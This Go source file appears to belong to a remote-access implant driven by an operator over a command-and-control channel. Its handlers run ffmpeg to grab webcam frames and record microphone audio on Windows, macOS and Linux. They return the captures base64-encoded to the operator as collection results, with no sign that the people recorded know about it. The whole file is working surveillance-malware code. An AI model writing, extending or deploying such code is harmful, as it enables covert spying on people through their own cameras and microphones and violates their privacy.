//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
)

// handleWebcam captures a still frame from the default webcam using ffmpeg and
// returns it as a base64 JPEG result. The operator may pass an optional device
// hint / extra args in task.Command (e.g. a DirectShow device name). (P2: audio
// / webcam collection.)
func handleWebcam(task Task, res *TaskResult) {
	out, err := os.CreateTemp("", "fc2-webcam-*.jpg")
	if err != nil {
		res.Error = "webcam: temp file: " + err.Error()
		return
	}
	outPath := out.Name()
	out.Close()
	defer os.Remove(outPath)

	args := webcamFFmpegArgs(task.Command, outPath)
	if Debug {
		fmt.Printf("[*] webcam ffmpeg %s\n", strings.Join(args, " "))
	}
	if err := runFFmpeg(args, "webcam"); err != nil {
		res.Error = err.Error()
		return
	}
	data, err := os.ReadFile(outPath)
	if err != nil {
		res.Error = "webcam: read: " + err.Error()
		return
	}
	if len(data) == 0 {
		res.Error = "webcam: ffmpeg produced no frame (is a camera attached / ffmpeg installed?)"
		return
	}
	res.Output = base64.StdEncoding.EncodeToString(data)
	res.Encoding = "base64"
	res.Filename = "webcam.jpg"
	res.Type = task.Type
}

// handleMic records audio from the default microphone for the requested number
// of seconds (default 5) and returns it as a base64 WAV result. task.Command
// may carry the duration in seconds or an optional device hint.
func handleMic(task Task, res *TaskResult) {
	dur := 5
	if task.Command != "" {
		if n, err := strconv.Atoi(strings.Fields(task.Command)[0]); err == nil && n > 0 && n <= 300 {
			dur = n
		}
	}
	out, err := os.CreateTemp("", "fc2-mic-*.wav")
	if err != nil {
		res.Error = "mic: temp file: " + err.Error()
		return
	}
	outPath := out.Name()
	out.Close()
	defer os.Remove(outPath)

	args := micFFmpegArgs(task.Command, outPath, dur)
	if Debug {
		fmt.Printf("[*] mic ffmpeg %s\n", strings.Join(args, " "))
	}
	if err := runFFmpeg(args, "mic"); err != nil {
		res.Error = err.Error()
		return
	}
	data, err := os.ReadFile(outPath)
	if err != nil {
		res.Error = "mic: read: " + err.Error()
		return
	}
	if len(data) == 0 {
		res.Error = "mic: ffmpeg produced no audio (is a microphone attached / ffmpeg installed?)"
		return
	}
	res.Output = base64.StdEncoding.EncodeToString(data)
	res.Encoding = "base64"
	res.Filename = "mic.wav"
	res.Type = task.Type
}

func runFFmpeg(args []string, label string) error {
	path, err := exec.LookPath("ffmpeg")
	if err != nil {
		return fmt.Errorf("%s: ffmpeg not found on PATH (install ffmpeg to enable capture)", label)
	}
	cmd := exec.Command(path, args...)
	var stderr strings.Builder
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		msg := stderr.String()
		if msg == "" {
			msg = err.Error()
		}
		return fmt.Errorf("%s: ffmpeg failed: %s", label, msg)
	}
	return nil
}

// webcamFFmpegArgs builds a single-frame capture command appropriate to the
// host OS. A device hint in `hint` overrides the OS default (e.g. a DirectShow
// device name on Windows).
func webcamFFmpegArgs(hint, out string) []string {
	switch runtime.GOOS {
	case "windows":
		dev := "Integrated Camera"
		if hint != "" {
			dev = hint
		}
		return []string{"-f", "dshow", "-i", "video=" + dev, "-frames:v", "1", "-y", out}
	case "darwin":
		dev := "0"
		if hint != "" {
			dev = hint
		}
		return []string{"-f", "avfoundation", "-i", dev, "-frames:v", "1", "-y", out}
	default: // linux / bsd
		dev := "/dev/video0"
		if hint != "" {
			dev = hint
		}
		return []string{"-f", "v4l2", "-i", dev, "-frames:v", "1", "-y", out}
	}
}

// micFFmpegArgs builds a timed audio-capture command appropriate to the host OS.
func micFFmpegArgs(hint string, out string, dur int) []string {
	switch runtime.GOOS {
	case "windows":
		dev := "Microphone"
		if hint != "" {
			dev = hint
		}
		return []string{"-f", "dshow", "-i", "audio=" + dev, "-t", strconv.Itoa(dur), "-y", out}
	case "darwin":
		dev := ":0"
		if hint != "" {
			dev = ":" + hint
		}
		return []string{"-f", "avfoundation", "-i", dev, "-t", strconv.Itoa(dur), "-y", out}
	default:
		dev := "default"
		if hint != "" {
			dev = hint
		}
		return []string{"-f", "alsa", "-i", dev, "-t", strconv.Itoa(dur), "-y", out}
	}
}
